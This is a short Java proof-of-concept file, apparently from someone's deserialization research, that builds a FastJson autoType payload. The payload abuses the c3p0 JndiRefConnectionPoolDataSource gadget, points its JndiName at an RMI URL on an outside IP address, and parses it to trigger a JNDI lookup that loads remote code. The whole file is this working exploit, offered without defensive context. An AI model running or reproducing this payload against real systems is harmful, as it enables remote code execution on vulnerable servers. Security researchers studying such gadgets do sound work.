package Seri.C3p0;

import com.alibaba.fastjson.JSON;
import com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource;

public class JNDI {
    public static void main(String[] args) {
        /**
         * 基于FastJson或JackSon触发setter
         *
         *
         */
//        JSON.parse();
        String payload = "{" +
                "\"@type\":\"com.mchange.v2.c3p0.JndiRefConnectionPoolDataSource\"," +

                "\"JndiName\":\"rmi://123.206.100.143:1099/kra5u9\", " +

                "\"LoginTimeout\":0" +

                "}";
        JSON.parse(payload);
    }
}
